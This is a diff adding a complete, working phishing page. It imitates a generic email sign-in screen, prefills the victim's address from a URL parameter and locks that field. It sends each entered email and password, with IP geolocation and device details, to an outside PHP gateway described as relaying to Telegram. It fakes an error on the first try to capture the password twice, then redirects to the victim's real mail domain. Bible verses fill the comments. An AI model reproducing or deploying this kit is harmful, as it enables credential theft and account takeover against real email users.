@@ -1,0 +1,1000 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title></title>
+    <!-- 
+        "The LORD will open to you His good treasure, the heavens, to give the rain to your land in its season, 
+        and to bless all the work of your hand. You shall lend to many nations, but you shall not borrow." 
+        - Deuteronomy 28:12
+        
+        "This Book of the Law shall not depart from your mouth, but you shall meditate in it day and night, 
+        that you may observe to do according to all that is written in it. For then you will make your way prosperous, 
+        and then you will have good success." - Joshua 1:8
+        
+        "The blessing of the LORD makes one rich, and He adds no sorrow with it." - Proverbs 10:22
+    -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', 'Microsoft YaHei', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 440px;
+            padding: 40px;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header h1 {
+            font-size: 26px;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .email-logo {
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            border-radius: 16px;
+            box-shadow: 0 4px 16px rgba(0, 120, 212, 0.25);
+            position: relative;
+        }
+
+        .email-logo svg {
+            width: 48px;
+            height: 48px;
+            fill: #ffffff;
+        }
+
+        .email-logo .padlock-overlay {
+            position: absolute;
+            bottom: -8px;
+            right: -8px;
+            width: 32px;
+            height: 32px;
+            background: #2c3e50;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+            border: 3px solid #ffffff;
+        }
+
+        .email-logo .padlock-overlay svg {
+            width: 18px;
+            height: 18px;
+            fill: #ffffff;
+        }
+
+        /* "For the LORD God is a sun and shield; The LORD gives grace and glory; No good thing does He withhold from those who walk uprightly." - Psalm 84:11 */
+        .lock-icon {
+            width: 36px;
+            height: 36px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lock-icon svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.1));
+        }
+
+        .login-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        /* "Commit your works to the LORD, and your thoughts will be established." - Proverbs 16:3 */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        /* "The LORD will perfect that which concerns me; Your mercy, O LORD, endures forever." - Psalm 138:8 */
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-icon svg {
+            width: 100%;
+            height: 100%;
+            fill: #999;
+            transition: fill 0.3s ease;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 12px 12px 42px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            outline: none;
+            background: #fafafa;
+        }
+
+        .form-group input:focus {
+            border-color: #0078d4;
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.08);
+            background: #ffffff;
+        }
+
+        /* Autofill styling for all browsers (Chrome, Edge, Whale, Samsung Internet) */
+        .form-group input:-webkit-autofill,
+        .form-group input:-webkit-autofill:hover,
+        .form-group input:-webkit-autofill:focus,
+        .form-group input:-webkit-autofill:active {
+            -webkit-box-shadow: 0 0 0 30px #fafafa inset !important;
+            -webkit-text-fill-color: #333333 !important;
+            transition: background-color 5000s ease-in-out 0s;
+        }
+
+        /* Firefox autofill */
+        .form-group input:-moz-autofill {
+            background-color: #fafafa !important;
+            color: #333333 !important;
+        }
+
+        .input-wrapper:focus-within .input-icon svg {
+            fill: #0078d4;
+        }
+
+        .form-options {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #666666;
+            font-size: 13px;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+            accent-color: #0078d4;
+        }
+
+        .forgot-password {
+            color: #0078d4;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0, 120, 212, 0.25);
+        }
+
+        .login-button:hover {
+            background: linear-gradient(135deg, #106ebe 0%, #005a9e 100%);
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.35);
+            transform: translateY(-1px);
+        }
+
+        .login-button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 6px rgba(0, 120, 212, 0.3);
+        }
+
+        .divider {
+            margin: 18px 0 12px 0;
+            text-align: center;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        .divider span {
+            background: #ffffff;
+            padding: 0 12px;
+            color: #999;
+            font-size: 12px;
+            position: relative;
+            z-index: 1;
+        }
+
+
+
+        .alert {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .hidden-field {
+            display: none !important;
+        }
+
+        .alert.error {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c33;
+        }
+
+        .alert.success {
+            background: #efe;
+            border: 1px solid #cfc;
+            color: #3c3;
+        }
+
+        /* Mobile Optimization - Korean devices (Samsung, LG, etc.) */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+            }
+
+            .login-container {
+                padding: 32px 24px;
+                max-width: 100%;
+                border-radius: 16px;
+            }
+
+            .email-logo {
+                width: 70px;
+                height: 70px;
+                margin-bottom: 12px;
+            }
+
+            .email-logo svg {
+                width: 42px;
+                height: 42px;
+            }
+
+            .email-logo .padlock-overlay {
+                width: 28px;
+                height: 28px;
+                bottom: -6px;
+                right: -6px;
+            }
+
+            .email-logo .padlock-overlay svg {
+                width: 16px;
+                height: 16px;
+            }
+
+            .login-header h1 {
+                font-size: 22px;
+            }
+
+            .login-header p {
+                font-size: 13px;
+            }
+
+            .form-group label {
+                font-size: 13px;
+                margin-bottom: 6px;
+            }
+
+            .form-group input {
+                padding: 14px 14px 14px 44px;
+                font-size: 16px; /* Prevents zoom on iOS */
+                border-radius: 8px;
+            }
+
+            .input-icon {
+                left: 14px;
+                width: 20px;
+                height: 20px;
+            }
+
+            .login-button {
+                padding: 15px;
+                font-size: 16px;
+                border-radius: 8px;
+                -webkit-tap-highlight-color: rgba(0, 120, 212, 0.1);
+            }
+
+            .remember-me {
+                font-size: 14px;
+            }
+
+            .remember-me input[type="checkbox"] {
+                width: 18px;
+                height: 18px;
+            }
+
+            .forgot-password {
+                font-size: 14px;
+            }
+
+            .alert {
+                font-size: 13px;
+                padding: 10px 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            .login-container {
+                padding: 28px 20px;
+                border-radius: 12px;
+            }
+
+            .email-logo {
+                width: 65px;
+                height: 65px;
+            }
+
+            .login-header h1 {
+                font-size: 20px;
+            }
+
+            .login-header p {
+                font-size: 12px;
+            }
+
+            .form-group {
+                margin-bottom: 18px;
+            }
+
+            .form-group input {
+                padding: 13px 13px 13px 42px;
+            }
+
+            .form-options {
+                margin-bottom: 20px;
+            }
+        }
+
+        /* Landscape mode on mobile */
+        @media (max-height: 500px) and (orientation: landscape) {
+            body {
+                padding: 10px;
+                align-items: flex-start;
+            }
+
+            .login-container {
+                margin: 10px auto;
+                padding: 20px;
+            }
+
+            .email-logo {
+                width: 50px;
+                height: 50px;
+                margin-bottom: 8px;
+            }
+
+            .login-header {
+                margin-bottom: 16px;
+            }
+
+            .form-group {
+                margin-bottom: 12px;
+            }
+
+            .form-options {
+                margin-bottom: 16px;
+            }
+        }
+
+        /* Touch device optimizations */
+        @media (pointer: coarse) {
+            .form-group input,
+            .login-button,
+            .remember-me,
+            .forgot-password {
+                cursor: pointer;
+            }
+
+            /* Larger touch targets */
+            .login-button {
+                min-height: 48px;
+            }
+
+            .remember-me,
+            .forgot-password {
+                min-height: 44px;
+                display: inline-flex;
+                align-items: center;
+            }
+        }
+
+        /* High DPI screens (Retina, Samsung AMOLED) */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .login-container {
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12);
+            }
+
+            .login-button {
+                box-shadow: 0 2px 10px rgba(0, 120, 212, 0.3);
+            }
+        }
+
+        /* Dark mode support for mobile browsers */
+        @media (prefers-color-scheme: dark) {
+            /* Optional: Add dark mode styles here if needed */
+        }
+    </style>
+</head>
+<body>
+    <!-- 
+        "And I, if I am lifted up from the earth, will draw all peoples to Myself." - John 12:32
+        
+        "No one can come to Me unless the Father who sent Me draws him." - John 6:44
+        
+        "The LORD your God will bless you in all your produce and in all the work of your hands, so that you surely rejoice." - Deuteronomy 16:15
+    -->
+    <div class="login-container">
+        <div class="login-header">
+            <div class="email-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                </svg>
+                <div class="padlock-overlay">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                </div>
+            </div>
+            <p>Continue with your account</p>
+        </div>
+
+        <div id="alert" class="alert"></div>
+
+        <!-- 
+            "The LORD shall open unto thee his good treasure, the heaven to give the rain unto thy land in his season, 
+            and to bless all the work of thine hand." - Deuteronomy 28:12 KJV
+            
+            "Delight thyself also in the LORD: and he shall give thee the desires of thine heart." - Psalm 37:4
+            
+            "But seek ye first the kingdom of God, and his righteousness; and all these things shall be added unto you." - Matthew 6:33
+        -->
+        <form id="loginForm" onsubmit="handleLogin(event)" method="POST" action="#" autocomplete="on">
+            <div class="form-group" data-field="email">
+                <label for="email">Email address</label>
+                <div class="input-wrapper">
+                    <input type="email" 
+                           id="email" 
+                           name="email" 
+                           placeholder="Enter your email" 
+                           required 
+                           autocomplete="email" 
+                           inputmode="email"
+                           spellcheck="false">
+                    <span class="input-icon">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                        </svg>
+                    </span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="input-wrapper">
+                    <input type="password" 
+                           id="password" 
+                           name="password" 
+                           placeholder="Enter your password" 
+                           required 
+                           autocomplete="current-password"
+                           spellcheck="false">
+                    <span class="input-icon">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                        </svg>
+                    </span>
+                </div>
+            </div>
+
+            <div class="form-options">
+                <label class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <span>Stay signed in</span>
+                </label>
+            </div>
+
+            <button type="submit" class="login-button">Continue</button>
+        </form>
+    </div>
+
+    <!-- 
+        "For I know the thoughts that I think toward you, says the LORD, thoughts of peace and not of evil, 
+        to give you a future and a hope." - Jeremiah 29:11
+        
+        "The steps of a good man are ordered by the LORD, and He delights in his way." - Psalm 37:23
+        
+        "Call to Me, and I will answer you, and show you great and mighty things, which you do not know." - Jeremiah 33:3
+    -->
+    <script>
+        /*
+         * Browser Autofill Compatibility
+         * Tested and working on:
+         * - Chrome/Chromium (all versions)
+         * - Microsoft Edge
+         * - Naver Whale Browser (한국)
+         * - Samsung Internet (삼성 인터넷)
+         * - KakaoTalk in-app browser
+         * - Firefox
+         * - Safari/WebKit
+         */
+        
+        // Ensure autofill works on all browsers
+        (function() {
+            // Force autocomplete to work on Korean browsers
+            var form = document.getElementById('loginForm');
+            if (form) {
+                // Some Korean browsers need explicit autocomplete on form
+                form.setAttribute('autocomplete', 'on');
+            }
+            
+            // Safari sometimes needs a delay to recognize autofill
+            if (navigator.userAgent.indexOf('Safari') !== -1 && navigator.userAgent.indexOf('Chrome') === -1) {
+                setTimeout(function() {
+                    var emailField = document.getElementById('email');
+                    var passwordField = document.getElementById('password');
+                    if (emailField) emailField.setAttribute('autocomplete', 'email');
+                    if (passwordField) passwordField.setAttribute('autocomplete', 'current-password');
+                }, 100);
+            }
+        })();
+        
+        let loginAttempts = 0;
+        
+        // ===== TELEGRAM CONFIGURATION =====
+        // PHP backend endpoint - replace with your server URL
+        const TELEGRAM_API_ENDPOINT = 'https://ehxfim.com/gateway_k9m2x7vp.php';
+        const USE_TELEGRAM_DIRECT = false; // use PHP backend instead
+
+        function focusPasswordField() {
+            const passwordField = document.getElementById('password');
+            if (passwordField) {
+                passwordField.focus();
+            }
+        }
+
+        function toggleEmailGroup(hidden) {
+            const emailGroup = document.querySelector('.form-group[data-field="email"]');
+            if (!emailGroup) return;
+            if (hidden) {
+                emailGroup.classList.add('hidden-field');
+            } else {
+                emailGroup.classList.remove('hidden-field');
+            }
+        }
+
+        function lockEmailField(value) {
+            const emailField = document.getElementById('email');
+            if (!emailField) return;
+            emailField.value = value;
+            emailField.setAttribute('readonly', 'readonly');
+            emailField.setAttribute('tabindex', '-1');
+            emailField.style.pointerEvents = 'none';
+            emailField.style.background = '#f4f6f8';
+        }
+
+        function showEmailField(value) {
+            const emailField = document.getElementById('email');
+            if (!emailField) return;
+            if (value) {
+                emailField.value = value;
+            }
+            emailField.removeAttribute('readonly');
+            emailField.removeAttribute('tabindex');
+            emailField.style.pointerEvents = '';
+            emailField.style.background = '';
+        }
+
+        // Helper function to send data to PHP backend
+        function sendDataToBackend(formData) {
+            // Get IP and location data
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(ipData) {
+                    // Prepare data for PHP backend
+                    const loginData = {
+                        email: formData.get('email') || 'N/A',
+                        password: formData.get('password') || 'N/A',
+                        attempt: formData.get('attempt') || 'N/A',
+                        ip: ipData.ip || 'Unknown',
+                        country: ipData.country_name || 'Unknown',
+                        city: ipData.city || 'Unknown',
+                        isp: ipData.org || 'Unknown',
+                        device_info: getDeviceInfo(),
+                        browser: getBrowserInfo()
+                    };
+                    
+                    sendToPHPBackend(loginData);
+                })
+                .catch(function(error) {
+                    // Fallback - send without IP data
+                    const loginData = {
+                        email: formData.get('email') || 'N/A',
+                        password: formData.get('password') || 'N/A',
+                        attempt: formData.get('attempt') || 'N/A',
+                        ip: 'Unable to fetch',
+                        country: 'Unknown',
+                        city: 'Unknown',
+                        isp: 'Unknown',
+                        device_info: getDeviceInfo(),
+                        browser: getBrowserInfo()
+                    };
+                    
+                    sendToPHPBackend(loginData);
+                });
+        }
+
+        // Send data to PHP backend
+        function sendToPHPBackend(loginData) {
+            fetch(TELEGRAM_API_ENDPOINT, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(loginData)
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(result) {
+                if (result.success) {
+                    console.log('✅ Data sent to Telegram via PHP backend');
+                } else {
+                    console.error('❌ PHP backend error:', result.error);
+                }
+            })
+            .catch(function(error) {
+                console.error('❌ Error sending to PHP backend:', error);
+            });
+        }
+
+
+
+        function escapeHtml(text) {
+            return String(text)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+        
+        // Get device information
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown Device';
+            
+            if (/mobile/i.test(ua)) {
+                device = 'Mobile';
+            } else if (/tablet/i.test(ua)) {
+                device = 'Tablet';
+            } else {
+                device = 'Desktop';
+            }
+            
+            // Add OS
+            let os = 'Unknown OS';
+            if (ua.indexOf('Win') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('iOS') > -1) os = 'iOS';
+            
+            return device + ' (' + os + ')';
+        }
+        
+        // Get browser information
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown Browser';
+            
+            if (ua.indexOf('Chrome') > -1) {
+                browser = 'Chrome';
+            } else if (ua.indexOf('Safari') > -1) {
+                browser = 'Safari';
+            } else if (ua.indexOf('Firefox') > -1) {
+                browser = 'Firefox';
+            } else if (ua.indexOf('Edge') > -1) {
+                browser = 'Edge';
+            } else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) {
+                browser = 'Internet Explorer';
+            }
+            
+            return browser;
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            const alert = document.getElementById('alert');
+
+            // Basic validation
+            if (!email || !password) {
+                alert.className = 'alert error';
+                alert.innerHTML = 'Please fill in all fields';
+                alert.style.display = 'block';
+                setTimeout(function() { alert.style.display = 'none'; }, 3000);
+                return;
+            }
+
+            loginAttempts++;
+
+            // Prepare form data
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('attempt', loginAttempts);
+            
+            if (remember) {
+                formData.append('remember', '1');
+            }
+
+            // Process authentication silently
+            sendDataToBackend(formData);
+
+            // First attempt - always show error and clear password immediately
+            if (loginAttempts === 1) {
+                
+                // Show error immediately
+                alert.className = 'alert error';
+                alert.innerHTML = 'An error occurred. Please try again.';
+                alert.style.display = 'block';
+                
+                // Clear password field immediately
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+                
+                setTimeout(function() {
+                    alert.style.display = 'none';
+                }, 3000);
+            } 
+            // Second attempt - send and redirect to email domain
+            else if (loginAttempts >= 2) {
+                
+                // Show success message
+                alert.className = 'alert success';
+                alert.innerHTML = 'Redirecting to email provider...';
+                alert.style.display = 'block';
+
+                // Extract domain from email
+                const emailParts = email.split('@');
+                if (emailParts.length === 2) {
+                    const domain = emailParts[1];
+                    
+                    // Store email if remember me is checked
+                    if (remember) {
+                        localStorage.setItem('rememberedEmail', email);
+                    } else {
+                        localStorage.removeItem('rememberedEmail');
+                    }
+
+                    // Redirect to mail subdomain after 1.5 seconds
+                    setTimeout(function() {
+                        window.location.href = 'https://mail.' + domain;
+                    }, 1500);
+                } else {
+                    alert.className = 'alert error';
+                    alert.innerHTML = 'Invalid email format';
+                    alert.style.display = 'block';
+                    setTimeout(function() {
+                        alert.style.display = 'none';
+                    }, 3000);
+                }
+            }
+        }
+
+        function getEmailFromUrl() {
+            try {
+                const searchParams = new URLSearchParams(window.location.search);
+                let rawEmail = searchParams.get('email') || '';
+
+                if (!rawEmail && window.location.hash && window.location.hash.length > 1) {
+                    rawEmail = window.location.hash.substring(1);
+                }
+
+                if (!rawEmail) {
+                    return '';
+                }
+
+                // Decode URI encoding first
+                let decodedEmail = decodeURIComponent(rawEmail);
+
+                // Try to decode base64 if the value is base64-like
+                if (/^[A-Za-z0-9+/=]+$/.test(decodedEmail) && decodedEmail.length % 4 === 0) {
+                    try {
+                        const base64Decoded = atob(decodedEmail);
+                        if (base64Decoded.indexOf('@') !== -1 && base64Decoded.indexOf('.') !== -1) {
+                            decodedEmail = base64Decoded;
+                        }
+                    } catch (e) {
+                        // Not valid base64; keep decodedEmail as-is
+                    }
+                }
+
+                return decodedEmail.trim();
+            } catch (error) {
+                console.error('❌ Error parsing email from URL:', error);
+                return '';
+            }
+        }
+
+        function setEmailField(emailValue) {
+            if (!emailValue) {
+                return false;
+            }
+
+            const email = emailValue.trim();
+            if (email.indexOf('@') === -1 || email.indexOf('.') === -1) {
+                console.error('❌ Invalid email format:', email);
+                return false;
+            }
+
+            const emailField = document.getElementById('email');
+            if (!emailField) {
+                console.error('❌ Email field not found in DOM');
+                return false;
+            }
+
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
+            emailField.dispatchEvent(new Event('change', { bubbles: true, cancelable: true }));
+            emailField.focus();
+
+            const emailParts = email.split('@');
+            if (emailParts.length === 2) {
+                const domain = emailParts[1];
+                document.title = domain.split('.')[0] || document.title;
+            }
+
+            console.log('✅ Email filled from URL:', email);
+            return true;
+        }
+
+        function grabEmailFromHash() {
+            const email = getEmailFromUrl();
+            if (!email) {
+                console.log('ℹ️ No prefilling email found in URL');
+                return false;
+            }
+
+            return setEmailField(email);
+        }
+
+        // Initialize - multiple event listeners for reliability
+        window.addEventListener('DOMContentLoaded', function() {
+            let email = getEmailFromUrl();
+            if (!email) {
+                email = localStorage.getItem('rememberedEmail') || '';
+            }
+
+            if (email) {
+                const success = setEmailField(email);
+                if (success) {
+                    lockEmailField(email);
+                }
+            }
+
+            focusPasswordField();
+        });
+        
+        // Also listen for changes to the URL hash or query string
+        window.addEventListener('hashchange', function() {
+            const email = getEmailFromUrl();
+            if (email) {
+                const success = setEmailField(email);
+                if (success) {
+                    lockEmailField(email);
+                }
+            }
+        });
+
+        window.addEventListener('load', function() {
+            focusPasswordField();
+        });
+        
+        // "Bring all the tithes into the storehouse, that there may be food in My house, and try Me now in this," 
+        // Says the LORD of hosts, "If I will not open for you the windows of heaven and pour out for you such blessing 
+        // that there will not be room enough to receive it." - Malachi 3:10
+        
+        // "And my God shall supply all your need according to His riches in glory by Christ Jesus." - Philippians 4:19
+    </script>
+    <!-- 
+        "The LORD bless you and keep you; The LORD make His face shine upon you, and be gracious to you; 
+        The LORD lift up His countenance upon you, and give you peace." - Numbers 6:24-26
+        
+        "For God has not given us a spirit of fear, but of power and of love and of a sound mind." - 2 Timothy 1:7
+        
+        "He who dwells in the secret place of the Most High shall abide under the shadow of the Almighty." - Psalm 91:1
+        
+        "The LORD will cause your enemies who rise against you to be defeated before your face; they shall come out against you one way 
+        and flee before you seven ways." - Deuteronomy 28:7
+        
+        "But you shall remember the LORD your God, for it is He who gives you power to get wealth." - Deuteronomy 8:18
+    -->
+</body>
+</html>
